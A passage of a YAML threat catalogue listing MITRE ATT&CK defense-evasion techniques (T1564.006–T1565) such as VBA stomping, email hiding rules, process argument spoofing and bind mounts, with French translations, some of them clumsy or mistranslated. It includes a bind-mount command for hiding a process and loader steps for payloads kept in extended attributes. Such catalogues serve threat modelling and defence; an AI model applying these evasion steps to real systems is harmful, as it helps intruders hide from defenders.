          \ VMs 2024) Cr\xE9er une VM de cette mani\xE8re emp\xEAche qu\u2019elle\
          \ apparaisse dans la console vCenter ou dans la sortie de la commande 'vim-cmd\
          \ vmsvc/getallvms' sur le serveur ESXi, la cachant ainsi des activit\xE9\
          s administratives typiques. (Citation : MITRE VMware Abuse 2024)\nhttps://attack.mitre.org/techniques/T1564/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.007
    ref_id: T1564.007
    name: VBA Stomping
    description: "Adversaries may hide malicious Visual Basic for Applications (VBA)\
      \ payloads embedded within MS Office documents by replacing the VBA source code\
      \ with benign data.(Citation: FireEye VBA stomp Feb 2020)\n\nMS Office documents\
      \ with embedded VBA content store source code inside of module streams. Each\
      \ module stream has a <code>PerformanceCache</code> that stores a separate compiled\
      \ version of the VBA source code known as p-code. The p-code is executed when\
      \ the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which\
      \ contains the version-dependent description of the VBA project) matches the\
      \ version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation:\
      \ Microsoft _VBA_PROJECT Stream)\n\nAn adversary may hide malicious VBA code\
      \ by overwriting the VBA source code location with zero\u2019s, benign code,\
      \ or random bytes while leaving the previously compiled malicious p-code. Tools\
      \ that scan for malicious VBA source code may be bypassed as the unwanted code\
      \ is hidden in the compiled p-code. If the VBA source code is removed, some\
      \ tools might even think that there are no macros present. If there is a version\
      \ match between the <code>_VBA_PROJECT</code> stream and host MS Office application,\
      \ the p-code will be executed, otherwise the benign VBA source code will be\
      \ decompressed and recompiled to p-code, thus removing malicious p-code and\
      \ potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation:\
      \ FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)\nhttps://attack.mitre.org/techniques/T1564/007"
    translations:
      fr:
        name: Coups de pied dans le VBA
        description: "Les adversaires peuvent dissimuler des charges utiles malveillantes\
          \ de Visual Basic for Applications (VBA) int\xE9gr\xE9es dans les documents\
          \ MS Office en rempla\xE7ant le code source VBA par des donn\xE9es inoffensives.\
          \ (Citation : FireEye VBA stomp f\xE9vr. 2020)\n\nLes documents MS Office\
          \ avec contenu VBA int\xE9gr\xE9 stockent le code source \xE0 l\u2019int\xE9\
          rieur des flux de modules. Chaque flux de modules poss\xE8de un <code>PerformanceCache</code>\
          \ qui stocke une version compil\xE9e distincte du code source VBA appel\xE9\
          e p-code. Le p-code est ex\xE9cut\xE9 lorsque la version MS Office sp\xE9\
          cifi\xE9e dans le flux <code>_VBA_PROJECT</code> (qui contient la description\
          \ d\xE9pendante de la version du projet VBA) correspond \xE0 la version\
          \ de l\u2019application MS Office h\xF4te. (Citation : Evil Clippy mai 2019)(Citation\
          \ : Microsoft _VBA_PROJECT Stream)\n\nUn adversaire peut masquer un code\
          \ VBA malveillant en \xE9crasant l\u2019emplacement du code source VBA par\
          \ des z\xE9ros, du code b\xE9nin ou des octets al\xE9atoires tout en laissant\
          \ le p-code malveillant pr\xE9c\xE9demment compil\xE9. Les outils qui scannent\
          \ le code source VBA malveillant peuvent \xEAtre contourn\xE9s car le code\
          \ ind\xE9sirable est cach\xE9 dans le p-code compil\xE9. Si le code source\
          \ VBA est supprim\xE9, certains outils pourraient m\xEAme penser qu\u2019\
          il n\u2019y a pas de macros pr\xE9sentes. S\u2019il y a une correspondance\
          \ de version entre le flux <code>_VBA_PROJECT</code> et l\u2019application\
          \ MS Office h\xF4te, le p-code sera ex\xE9cut\xE9, sinon le code source\
          \ VBA bienveillant sera d\xE9compress\xE9 et recompil\xE9 en p-code, supprimant\
          \ ainsi le p-code malveillant et potentiellement contournant l\u2019analyse\
          \ dynamique. (Citation : Walmart Roberts oct. 2018)(Citation : FireEye VBA\
          \ stomp f\xE9vr. 2020)(Citation : pcodedmp Bontchev)\nhttps://attack.mitre.org/techniques/T1564/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.008
    ref_id: T1564.008
    name: Email Hiding Rules
    description: 'Adversaries may use email rules to hide inbound emails in a compromised
      user''s mailbox. Many email clients allow users to create inbox rules for various
      email functions, including moving emails to other folders, marking emails as
      read, or deleting emails. Rules may be created or modified within email clients
      or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code>
      [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows
      systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation:
      Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)


      Adversaries may utilize email rules within a compromised user''s mailbox to
      delete and/or move emails to less noticeable folders. Adversaries may do this
      to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)
      emails sent from the compromised account.


      Any user or administrator within the organization (or adversary with valid credentials)
      may be able to create rules to automatically move or delete emails. These rules
      can be abused to impair/delay detection had the email content been immediately
      seen by a user or defender. Malicious rules commonly filter out emails based
      on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>,
      and <code>hack</code>) found in message bodies and subject lines. (Citation:
      Microsoft Cloud App Security)


      In some environments, administrators may be able to enable email rules that
      operate organization-wide rather than on individual inboxes. For example, Microsoft
      Exchange supports transport rules that evaluate all mail an organization receives
      against user-specified conditions, then performs a user-specified action on
      mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023)
      Adversaries that abuse such features may be able to automatically modify or
      delete all emails related to specific topics (such as internal security incident
      notifications).

      https://attack.mitre.org/techniques/T1564/008'
    translations:
      fr:
        name: "R\xE8gles de dissimulation des e-mails"
        description: "Les adversaires peuvent utiliser les r\xE8gles d\u2019e-mail\
          \ pour dissimuler les emails entrants dans la bo\xEEte aux lettres d\u2019\
          un utilisateur compromis. De nombreux clients de messagerie permettent aux\
          \ utilisateurs de cr\xE9er des r\xE8gles de bo\xEEte de r\xE9ception pour\
          \ diverses fonctions de messagerie, notamment d\xE9placer les emails vers\
          \ d\u2019autres dossiers, marquer les emails comme lus ou supprimer des\
          \ emails. Les r\xE8gles peuvent \xEAtre cr\xE9\xE9es ou modifi\xE9es au\
          \ sein des clients de messagerie ou via des fonctionnalit\xE9s externes\
          \ telles que les <code>cmdlets New-InboxRule</code> ou <code>Set-InboxRule</code>\
          \ [PowerShell](https://attack.mitre.org/techniques/T1059/001) sur les syst\xE8\
          mes Windows. (Citation : R\xE8gles de la bo\xEEte de r\xE9ception Microsoft)(Citation\
          \ : R\xE8gles de messagerie MacOS)(Citation : Microsoft New-InboxRule)(Citation\
          \ : Microsoft Set-InboxRule)\n\nLes adversaires peuvent utiliser les r\xE8\
          gles d\u2019e-mail dans la bo\xEEte aux lettres d\u2019un utilisateur compromis\
          \ pour supprimer et/ou d\xE9placer les e-mails vers des dossiers moins visibles.\
          \ Les adversaires peuvent faire cela pour masquer les alertes de s\xE9curit\xE9\
          , les communications C2 ou les r\xE9ponses aux e-mails [Spearphishing interne](https://attack.mitre.org/techniques/T1534)\
          \ envoy\xE9s depuis le compte compromis.\n\nTout utilisateur ou administrateur\
          \ au sein de l\u2019organisation (ou adversaire disposant d\u2019identifiants\
          \ valides) peut \xEAtre capable de cr\xE9er des r\xE8gles pour d\xE9placer\
          \ ou supprimer automatiquement des e-mails. Ces r\xE8gles peuvent \xEAtre\
          \ abus\xE9es pour compromettre ou retarder la d\xE9tection si le contenu\
          \ de l\u2019email a \xE9t\xE9 imm\xE9diatement vu par un utilisateur ou\
          \ un d\xE9fenseur. Les r\xE8gles malveillantes filtrent couramment les emails\
          \ en fonction de mots-cl\xE9s (tels que <code>malware</code>, <code>suspect,</code>\
          \ <code>phish</code> et <code>hack</code>) que l\u2019on trouve dans les\
          \ corps des messages et les sujets. (Citation : S\xE9curit\xE9 des applications\
          \ Microsoft Cloud)\n\nDans certains environnements, les administrateurs\
          \ peuvent \xEAtre capables d\u2019activer des r\xE8gles d\u2019email qui\
          \ fonctionnent \xE0 l\u2019\xE9chelle de l\u2019organisation plut\xF4t que\
          \ sur des bo\xEEtes de r\xE9ception individuelles. Par exemple, Microsoft\
          \ Exchange prend en charge des r\xE8gles de transport qui \xE9valuent tout\
          \ le courrier qu\u2019une organisation re\xE7oit selon des conditions sp\xE9\
          cifi\xE9es par l\u2019utilisateur, puis effectue une action sp\xE9cifi\xE9\
          e par l\u2019utilisateur sur le courrier qui respecte ces conditions. (Citation\
          \ : R\xE8gles de flux Microsoft Mail 2023) Les adversaires qui abusent de\
          \ ces fonctionnalit\xE9s peuvent modifier ou supprimer automatiquement tous\
          \ les courriels li\xE9s \xE0 des sujets sp\xE9cifiques (comme les notifications\
          \ d\u2019incidents de s\xE9curit\xE9 internes).\nhttps://attack.mitre.org/techniques/T1564/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.009
    ref_id: T1564.009
    name: Resource Forking
    description: "Adversaries may abuse resource forks to hide malicious code or executables\
      \ to evade detection and bypass security applications. A resource fork provides\
      \ applications a structured way to store resources such as thumbnail images,\
      \ menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical\
      \ File System Overview) Usage of a resource fork is identifiable when displaying\
      \ a file\u2019s extended attributes, using <code>ls -l@</code> or <code>xattr\
      \ -l</code> commands. Resource forks have been deprecated and replaced with\
      \ the application bundle structure. Non-localized resources are placed at the\
      \ top level directory of an application bundle, while localized resources are\
      \ placed in the <code>/Resources</code> folder.(Citation: Resource and Data\
      \ Forks)(Citation: ELC Extended Attributes)\n\nAdversaries can use resource\
      \ forks to hide malicious data that may otherwise be stored directly in files.\
      \ Adversaries can execute content with an attached resource fork, at a specified\
      \ offset, that is moved to an executable location then invoked. Resource fork\
      \ content may also be obfuscated/encrypted until execution.(Citation: sentinellabs\
      \ resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)\n\
      https://attack.mitre.org/techniques/T1564/009"
    translations:
      fr:
        name: Transformation de ressources
        description: "Les adversaires peuvent exploiter les forks de ressources pour\
          \ masquer du code malveillant ou des ex\xE9cutables afin d\u2019\xE9chapper\
          \ \xE0 la d\xE9tection et \xE0 contourner les applications de s\xE9curit\xE9\
          . Un fork de ressources offre aux applications un moyen structur\xE9 de\
          \ stocker des ressources telles que des images miniatures, des d\xE9finitions\
          \ de menus, des ic\xF4nes, des bo\xEEtes de dialogue et du code. (Citation\
          \ : Aper\xE7u du syst\xE8me de fichiers hi\xE9rarchique de macOS) L\u2019\
          utilisation d\u2019un fork de ressources est identifiable lors de l\u2019\
          affichage des attributs \xE9tendus d\u2019un fichier, en utilisant les commandes\
          \ <code>ls -l@</code> ou <code>xattr -l</code>. Les forks de ressources\
          \ ont \xE9t\xE9 d\xE9pr\xE9ci\xE9s et remplac\xE9s par la structure du bundle\
          \ applicatif. Les ressources non localis\xE9es sont plac\xE9es dans le r\xE9\
          pertoire principal d\u2019un paquet applicatif, tandis que les ressources\
          \ localis\xE9es sont plac\xE9es dans le dossier <code>/Resources</code>.\
          \ (Citation : Forks de ressources et de donn\xE9es)(Citation : Attributs\
          \ \xE9tendus ELC)\n\nLes adversaires peuvent utiliser des d\xE9rivations\
          \ de ressources pour dissimuler des donn\xE9es malveillantes qui pourraient\
          \ autrement \xEAtre stock\xE9es directement dans des fichiers. Les adversaires\
          \ peuvent ex\xE9cuter du contenu avec une fourche de ressources attach\xE9\
          e, \xE0 un d\xE9calage sp\xE9cifi\xE9, qui est d\xE9plac\xE9e vers un emplacement\
          \ ex\xE9cutable puis invoqu\xE9e. Le contenu du resource fork peut \xE9\
          galement \xEAtre obfusqu\xE9/chiffr\xE9 jusqu\u2019\xE0 son ex\xE9cution.\
          \ (Citation : ressource sentinellab nomm\xE9e fork 2020)(Citation : tau\
          \ bundlore erika noerenberg 2020)\nhttps://attack.mitre.org/techniques/T1564/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.010
    ref_id: T1564.010
    name: Process Argument Spoofing
    description: 'Adversaries may attempt to hide process command-line arguments by
      overwriting process memory. Process command-line arguments are stored in the
      process environment block (PEB), a data structure used by Windows to store various
      information about/used by a process. The PEB includes the process command-line
      arguments that are referenced when executing the process. When a process is
      created, defensive tools/sensors that monitor process creations may retrieve
      the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation:
      Xpn Argue Like Cobalt 2019)


      Adversaries may manipulate a process PEB to evade defenses. For example, [Process
      Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn
      a process in a suspended state with benign arguments. After the process is spawned
      and the PEB is initialized (and process information is potentially logged by
      tools/sensors), adversaries may override the PEB to modify the command-line
      arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106)
      <code>WriteProcessMemory()</code> function) then resume process execution with
      malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue
      Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)


      Adversaries may also execute a process with malicious command-line arguments
      then patch the memory with benign arguments that may bypass subsequent process
      memory analysis.(Citation: FireEye FiveHands April 2021)


      This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004))
      to manipulate or further evade process-based detections.

      https://attack.mitre.org/techniques/T1564/010'
    translations:
      fr:
        name: "Usurpation d\u2019arguments de processus"
        description: "Les adversaires peuvent tenter de masquer les arguments de la\
          \ ligne de commande du processus en \xE9crasant la m\xE9moire du processus.\
          \ Les arguments en ligne de commande du processus sont stock\xE9s dans le\
          \ bloc d\u2019environnement de processus (PEB), une structure de donn\xE9\
          es utilis\xE9e par Windows pour stocker diverses informations sur/utilis\xE9\
          es par un processus. Le PEB inclut les arguments en ligne de commande du\
          \ processus qui sont r\xE9f\xE9renc\xE9s lors de l\u2019ex\xE9cution du\
          \ processus. Lorsqu\u2019un processus est cr\xE9\xE9, des outils ou capteurs\
          \ d\xE9fensifs qui surveillent les cr\xE9ations de processus peuvent r\xE9\
          cup\xE9rer les arguments de processus depuis le PEB. (Citation : Microsoft\
          \ PEB 2021)(Citation : Xpn argumente Like Cobalt 2019)\n\nLes adversaires\
          \ peuvent manipuler un PEB de proc\xE9d\xE9 pour \xE9chapper aux d\xE9fenses.\
          \ Par exemple, [Creux de processus](https://attack.mitre.org/techniques/T1055/012)\
          \ peut \xEAtre abus\xE9 pour faire appara\xEEtre un processus en \xE9tat\
          \ suspendu avec des arguments b\xE9nins. Apr\xE8s que le processus est lanc\xE9\
          \ et que le PEB est initialis\xE9 (et que les informations du processus\
          \ sont potentiellement enregistr\xE9es par des outils/capteurs), les adversaires\
          \ peuvent passer outre le PEB pour modifier les arguments en ligne de commande\
          \ (ex : en utilisant la fonction <code>WriteProcessMemory(</code>) [API\
          \ native](https://attack.mitre.org/techniques/T1106)) puis reprendre l\u2019\
          ex\xE9cution du processus avec des arguments malveillants. (Citation : Arguments\
          \ sur la frappe du cobalt 2019)(Citation : Xpn argumente Like Cobalt 2019)(Citation\
          \ : Parodie Nviso Ligne de Commande 2020)\n\nLes adversaires peuvent \xE9\
          galement ex\xE9cuter un processus avec des arguments malveillants en ligne\
          \ de commande, puis patcher la m\xE9moire avec des arguments b\xE9nins qui\
          \ peuvent contourner l\u2019analyse ult\xE9rieure de la m\xE9moire du processus.\
          \ (Citation : FireEye FiveHands, avril 2021)\n\nCe comportement peut \xE9\
          galement \xEAtre combin\xE9 avec d\u2019autres astuces (telles que [Parent\
          \ PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) pour manipuler\
          \ ou contourner davantage les d\xE9tections bas\xE9es sur le processus.\n\
          https://attack.mitre.org/techniques/T1564/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.011
    ref_id: T1564.011
    name: Ignore Process Interrupts
    description: "Adversaries may evade defensive mechanisms by executing commands\
      \ that hide from process interrupt signals. Many operating systems use signals\
      \ to deliver messages to control process behavior. Command interpreters often\
      \ include specific commands/flags that ignore errors and other hangups, such\
      \ as when the user of the active session logs off.(Citation: Linux Signal Man)\
      \  These interrupt signals may also be used by defensive tools and/or analysts\
      \ to pause or terminate specified running processes. \n\nAdversaries may invoke\
      \ processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ `-ErrorAction SilentlyContinue`, or similar commands that may be immune to\
      \ hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue)\
      \ This may enable malicious commands and malware to continue execution through\
      \ system events that would otherwise terminate its execution, such as users\
      \ logging off or the termination of its C2 network connection.\n\nHiding from\
      \ process interrupt signals may allow malware to continue execution, but unlike\
      \ [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish\
      \ [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will\
      \ not be re-invoked once actually terminated.\nhttps://attack.mitre.org/techniques/T1564/011"
    translations:
      fr:
        name: Ignorer les interruptions de processus
        description: "Les adversaires peuvent contourner les m\xE9canismes d\xE9fensifs\
          \ en ex\xE9cutant des commandes qui dissimulent les signaux d\u2019interruption\
          \ du processus. De nombreux syst\xE8mes d\u2019exploitation utilisent des\
          \ signaux pour transmettre des messages afin de contr\xF4ler le comportement\
          \ des processus. Les interpr\xE9teurs de commandes incluent souvent des\
          \ commandes/drapeaux sp\xE9cifiques qui ignorent les erreurs et autres blocages,\
          \ comme lorsque l\u2019utilisateur de la session active se d\xE9connecte.\
          \ (Citation : Linux Signal Man) Ces signaux d\u2019interruption peuvent\
          \ \xE9galement \xEAtre utilis\xE9s par des outils d\xE9fensifs et/ou des\
          \ analystes pour mettre en pause ou terminer certains processus en cours\
          \ d\u2019ex\xE9cution. \n\nLes adversaires peuvent invoquer des processus\
          \ via 'nohup', [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ '-ErrorAction SilentlyContinue' ou d\u2019autres commandes similaires\
          \ qui peuvent \xEAtre \xE0 l\u2019abri des blocages. (Citation : nohup Linux\
          \ Man)(Citation : Microsoft PowerShell SilencieusementContinuer) Cela peut\
          \ permettre \xE0 des commandes malveillantes et aux logiciels malveillants\
          \ de poursuivre leur ex\xE9cution via des \xE9v\xE9nements syst\xE8me qui\
          \ mettraient autrement fin \xE0 son ex\xE9cution, comme la d\xE9connexion\
          \ des utilisateurs ou la fin de sa connexion r\xE9seau C2.\n\nSe cacher\
          \ des signaux d\u2019interruption de processus peut permettre aux malwares\
          \ de poursuivre leur ex\xE9cution, mais contrairement \xE0 [Trap](https://attack.mitre.org/techniques/T1546/005),\
          \ cela n\u2019\xE9tablit pas [Persistance](https://attack.mitre.org/tactics/TA0003)\
          \ puisque le processus ne sera pas r\xE9invoqu\xE9 une fois effectivement\
          \ termin\xE9.\nhttps://attack.mitre.org/techniques/T1564/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.012
    ref_id: T1564.012
    name: File/Path Exclusions
    description: 'Adversaries may attempt to hide their file-based artifacts by writing
      them to specific folders or file names excluded from antivirus (AV) scanning
      and other defensive capabilities. AV and other file-based scanners often include
      exclusions to optimize performance as well as ease installation and legitimate
      use of applications. These exclusions may be contextual (e.g., scans are only
      initiated in response to specific triggering events/alerts), but are also often
      hardcoded strings referencing specific folders and/or files assumed to be trusted
      and legitimate.(Citation: Microsoft File Folder Exclusions)


      Adversaries may abuse these exclusions to hide their file-based artifacts. For
      example, rather than  tampering with tool settings to add a new exclusion (i.e.,
      [Disable or Modify Tools](https://attack.mitre.org/techniques/T1685)), adversaries
      may drop their file-based payloads in default or otherwise well-known exclusions.
      Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)
      and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043)
      activities to both discover and verify existing exclusions in a victim environment.

      https://attack.mitre.org/techniques/T1564/012'
    translations:
      fr:
        name: Exclusions de fichiers/chemins
        description: "Les adversaires peuvent tenter de dissimuler leurs artefacts\
          \ bas\xE9s sur des fichiers en les \xE9crivant dans des dossiers ou noms\
          \ de fichiers sp\xE9cifiques exclus de l\u2019antivirus (AV) et d\u2019\
          autres capacit\xE9s d\xE9fensives. Les scanners antivirus et autres bas\xE9\
          s sur des fichiers incluent souvent des exclusions pour optimiser les performances\
          \ ainsi que faciliter l\u2019installation et l\u2019utilisation l\xE9gitime\
          \ des applications. Ces exclusions peuvent \xEAtre contextuelles (par exemple,\
          \ les scans ne sont initi\xE9s qu\u2019en r\xE9ponse \xE0 des \xE9v\xE9\
          nements ou alertes d\xE9clencheurs sp\xE9cifiques), mais sont aussi souvent\
          \ des cha\xEEnes cod\xE9es en dur faisant r\xE9f\xE9rence \xE0 des dossiers\
          \ et/ou fichiers sp\xE9cifiques suppos\xE9s fiables et l\xE9gitimes. (Citation\
          \ : Exclusions des dossiers Microsoft)\n\nLes adversaires peuvent abuser\
          \ de ces exclusions pour masquer leurs artefacts bas\xE9s sur des fichiers.\
          \ Par exemple, plut\xF4t que de modifier les param\xE8tres de l\u2019outil\
          \ pour ajouter une nouvelle exclusion (c\u2019est-\xE0-dire [D\xE9sactiver\
          \ ou modifier les outils](https://attack.mitre.org/techniques/T1685)), les\
          \ adversaires peuvent supprimer leurs charges utiles bas\xE9es sur des fichiers\
          \ dans des exclusions par d\xE9faut ou autrement bien connues. Les adversaires\
          \ peuvent \xE9galement utiliser [D\xE9couverte de logiciels de s\xE9curit\xE9\
          ](https://attack.mitre.org/techniques/T1518/001) et d\u2019autres activit\xE9\
          s de [D\xE9couverte](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043)\
          \ pour \xE0 la fois d\xE9couvrir et v\xE9rifier les exclusions existantes\
          \ dans un environnement victime.\nhttps://attack.mitre.org/techniques/T1564/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.013
    ref_id: T1564.013
    name: Bind Mounts
    description: "Adversaries may abuse bind mounts on file structures to hide their\
      \ activity and artifacts from native utilities. A bind mount maps a directory\
      \ or file from one location on the filesystem to another, similar to a shortcut\
      \ on Windows. It\u2019s commonly used to provide access to specific files or\
      \ directories across different environments, such as inside containers or chroot\
      \ environments, and requires sudo access. \n\nAdversaries may use bind mounts\
      \ to map either an empty directory or a benign `/proc` directory to a malicious\
      \ process\u2019s `/proc` directory. Using the commands `mount \u2013o bind /proc/benign-process\
      \ /proc/malicious-process` (or `mount \u2013B`), the malicious process's `/proc`\
      \ directory is overlayed with the contents of a benign process's `/proc` directory.\
      \ When system utilities query process activity, such as `ps` and `top`, the\
      \ kernel follows the bind mount and presents the benign directory\u2019s contents\
      \ instead of the malicious process's actual `/proc` directory. As a result,\
      \ these utilities display information that appears to come from the benign process,\
      \ effectively hiding the malicious process's metadata, executable, or other\
      \ artifacts from detection.(Citation: Cado Security Commando Cat 2024)(Citation:\
      \ Ahn Lab CoinMiner 2023)\nhttps://attack.mitre.org/techniques/T1564/013"
    translations:
      fr:
        name: Montures de liaison
        description: "Les adversaires peuvent abuser des montures de liaison sur les\
          \ structures de fichiers pour dissimuler leur activit\xE9 et leurs artefacts\
          \ aux utilitaires natifs. Un support de liaison mappe un r\xE9pertoire ou\
          \ un fichier d\u2019un emplacement du syst\xE8me de fichiers \xE0 un autre,\
          \ similaire \xE0 un raccourci sous Windows. Il est couramment utilis\xE9\
          \ pour donner acc\xE8s \xE0 des fichiers ou r\xE9pertoires sp\xE9cifiques\
          \ dans diff\xE9rents environnements, comme des conteneurs \xE0 l\u2019int\xE9\
          rieur ou des environnements chroot, et n\xE9cessite un acc\xE8s \xE0 des\
          \ sudo. \n\nLes adversaires peuvent utiliser des montures de liaison pour\
          \ mapper soit un r\xE9pertoire vide, soit un r\xE9pertoire b\xE9nin '/proc'\
          \ dans le r\xE9pertoire '/proc' d\u2019un processus malveillant. En utilisant\
          \ les commandes \xAB monter \u2013o lier /proc/benign-process /proc/malicious-process\
          \ \xBB (ou \xAB monter \u2013B \xBB), le r\xE9pertoire '/proc' du processus\
          \ malveillant est superpos\xE9 au contenu du dossier '/proc' d\u2019un processus\
          \ b\xE9nin. Lorsque les utilitaires syst\xE8me interrogent l\u2019activit\xE9\
          \ du processus, telle que 'ps' et 'top', le noyau suit le montage de liaison\
          \ et pr\xE9sente le contenu du r\xE9pertoire b\xE9nin au lieu du r\xE9pertoire\
          \ '/proc' du processus malveillant. En cons\xE9quence, ces utilitaires affichent\
          \ des informations qui semblent provenir du processus b\xE9nin, masquant\
          \ ainsi les m\xE9tadonn\xE9es, l\u2019ex\xE9cutable ou d\u2019autres artefacts\
          \ du processus malveillant \xE0 la d\xE9tection. (Citation : Cado Security\
          \ Commando Cat 2024)(Citation : Ahn Lab CoinMiner 2023)\nhttps://attack.mitre.org/techniques/T1564/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.014
    ref_id: T1564.014
    name: Extended Attributes
    description: 'Adversaries may abuse extended attributes (xattrs) on macOS and
      Linux to hide their malicious data in order to evade detection. Extended attributes
      are key-value pairs of file and directory metadata used by both macOS and Linux.
      They are not visible through standard tools like `Finder`,  `ls`, or `cat` and
      require utilities such as `xattr` (macOS) or `getfattr` (Linux) for inspection.
      Operating systems and applications use xattrs for tagging, integrity checks,
      and access control. On Linux, xattrs are organized into namespaces such as `user.`
      (user permissions), `trusted.` (root permissions), `security.`, and `system.`,
      each with specific permissions. On macOS, xattrs are flat strings without namespace
      prefixes, commonly prefixed with `com.apple.*` (e.g., `com.apple.quarantine`,
      `com.apple.metadata:_kMDItemUserTags`) and used by system features like Gatekeeper
      and Spotlight.(Citation: Establishing persistence using extended attributes
      on Linux)


      An adversary may leverage xattrs by embedding a second-stage payload into the
      extended attribute of a legitimate file. On macOS, a payload can be embedded
      into a custom attribute using the `xattr` command. A separate loader can retrieve
      the attribute with `xattr -p`, decode the content, and execute it using a scripting
      interpreter. On Linux, an adversary may use `setfattr` to write a payload into
      the `user.` namespace of a legitimate file. A loader script can later extract
      the payload with `getfattr --only-values`, decode it, and execute it using bash
      or another interpreter. In both cases, because the primary file content remains
      unchanged, security tools and integrity checks that do not inspect extended
      attributes will observe the original file hash, allowing the malicious payload
      to evade detection.(Citation: Low GroupIB xattrs nov 2024)

      https://attack.mitre.org/techniques/T1564/014'
    translations:
      fr:
        name: "Attributs \xE9tendus"
        description: "Les adversaires peuvent abuser des attributs \xE9tendus (xattrs)\
          \ sur macOS et Linux pour dissimuler leurs donn\xE9es malveillantes afin\
          \ d\u2019\xE9chapper \xE0 la d\xE9tection. Les attributs \xE9tendus sont\
          \ des paires cl\xE9-valeur de m\xE9tadonn\xE9es de fichiers et de r\xE9\
          pertoires utilis\xE9es \xE0 la fois par macOS et Linux. Ils ne sont pas\
          \ visibles via des outils standards comme \xAB Finder \xBB, \xAB ls \xBB\
          \ ou \xAB cat \xBB et n\xE9cessitent des utilitaires tels que \xAB xattr\
          \ \xBB (macOS) ou \xAB getfattr \xBB (Linux) pour inspection. Les syst\xE8\
          mes d\u2019exploitation et applications utilisent xattrs pour le tagage,\
          \ les v\xE9rifications d\u2019int\xE9grit\xE9 et le contr\xF4le d\u2019\
          acc\xE8s. Sous Linux, les xattrs sont organis\xE9s en espaces de noms tels\
          \ que \xAB utilisateur. \xBB (permissions utilisateur), \xAB trusted \xBB\
          \ (permissions root), \xAB security \xBB et \xAB system. \xBB, chacun avec\
          \ des permissions sp\xE9cifiques. Sur macOS, les xattrs sont des cha\xEE\
          nes plates sans pr\xE9fixes d\u2019espace de noms, couramment pr\xE9c\xE9\
          d\xE9es de \xAB com.apple.* \xBB (par exemple, \xAB com.apple.quarantine\
          \ \xBB, \xAB com.apple.metadata\_:_kMDItemUserTags \xBB) et utilis\xE9es\
          \ par des fonctionnalit\xE9s syst\xE8me comme Gatekeeper et Spotlight. (Citation\
          \ : \xC9tablir la persistance \xE0 l\u2019aide d\u2019attributs \xE9tendus\
          \ sur Linux)\n\nUn adversaire peut tirer parti des xattrs en int\xE9grant\
          \ une charge utile de second \xE9tage dans l\u2019attribut \xE9tendu d\u2019\
          un fichier l\xE9gitime. Sur macOS, une charge utile peut \xEAtre int\xE9\
          gr\xE9e dans un attribut personnalis\xE9 \xE0 l\u2019aide de la commande\
          \ 'xattr'. Un chargeur s\xE9par\xE9 peut r\xE9cup\xE9rer l\u2019attribut\
          \ avec 'xattr -p', d\xE9coder le contenu et l\u2019ex\xE9cuter \xE0 l\u2019\
          aide d\u2019un interpr\xE9teur de script. Sous Linux, un adversaire peut\
          \ utiliser \xAB setfattr \xBB pour \xE9crire une charge utile dans l\u2019\
          espace de noms \xAB user. \xBB d\u2019un fichier l\xE9gitime. Un script\
          \ de chargeur peut ensuite extraire la charge utile avec 'getfattr --only-values',\
          \ la d\xE9coder et l\u2019ex\xE9cuter via bash ou un autre interpr\xE9teur.\
          \ Dans les deux cas, parce que le contenu principal du fichier reste inchang\xE9\
          , les outils de s\xE9curit\xE9 et les v\xE9rifications d\u2019int\xE9grit\xE9\
          \ qui n\u2019inspectent pas les attributs \xE9tendus observeront le hachage\
          \ du fichier original, permettant \xE0 la charge utile malveillante d\u2019\
          \xE9chapper \xE0 la d\xE9tection. (Citation : Low GroupIB xattrs nov. 2024)\n\
          https://attack.mitre.org/techniques/T1564/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1565
    ref_id: T1565
    name: Data Manipulation
    description: 'Adversaries may insert, delete, or manipulate data in order to influence
      external outcomes or hide activity, thus threatening the integrity of the data.(Citation:
      Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt
      to affect a business process, organizational understanding, or decision making.


      The type of modification and the impact it will have depends on the target application
      and process as well as the goals and objectives of the adversary. For complex
      systems, an adversary would likely need special expertise and possibly access
      to specialized software related to the system that would typically be gained
      through a prolonged information gathering campaign in order to have the desired
      impact.

      https://attack.mitre.org/techniques/T1565'
    translations:
      fr:
        name: "Manipulation des donn\xE9es"
        description: "Les adversaires peuvent ins\xE9rer, supprimer ou manipuler des\
